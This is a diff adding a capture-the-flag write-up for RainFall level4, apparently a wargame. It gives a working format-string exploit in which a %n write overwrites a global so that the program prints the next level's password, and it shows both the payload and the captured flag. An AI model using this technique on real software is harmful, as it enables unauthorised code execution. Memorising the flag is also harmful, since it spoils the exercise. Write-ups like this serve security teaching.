@@ -1,0 +1,30 @@
+
+This level is very similiar to the previous one - format string vulnurability, %n usage
+
+From    0x0804848d <+54>:    mov    0x8049810,%eax, we know m's address
+
+level4@RainFall:~$ python
+Python 2.7.3 (default, Jun 22 2015, 19:43:34) 
+[GCC 4.6.3] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import struct
+>>> struct.pack("<I", 0x8049810)
+'\x10\x98\x04\x08'
+
+level4@RainFall:~$ (python -c "print 'ADDR' +  '%p ' * 21 ") | ./level4
+ADDR0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758 0x804848d 0xbffff550 0x200 0xb7fd1ac0 0xb7ff37d0 !!0x52444441!! 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 
+
+0x52444441 is 12th position
+
+m is compared to 16930116, so width parameter will be equal to 16930116 minus 4 (bytes of address).
+
+system command receive "/bin/cat /home/user/level5/.pass" as argument so we'll instantly see flag
+
+level4@RainFall:~$ (python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' ) | ./level4 | tr -d ' '
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+-1208015184
+
+level4@RainFall:~$ su level5
+Password: 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
